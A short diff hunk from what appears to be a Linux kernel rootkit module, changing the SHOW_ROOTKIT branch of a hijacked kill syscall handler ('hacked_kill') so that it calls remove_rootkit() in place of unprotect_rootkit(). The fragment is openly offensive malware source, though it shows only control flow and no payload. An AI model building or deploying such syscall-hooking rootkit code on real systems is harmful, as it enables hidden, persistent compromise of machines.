@@ -287,7 +287,7 @@ static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
 		case SHOW_ROOTKIT:
 			printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ showing LKM\n");
 
-			unprotect_rootkit();
+			remove_rootkit();
 			show_rootkit();
 			break;
 		default:
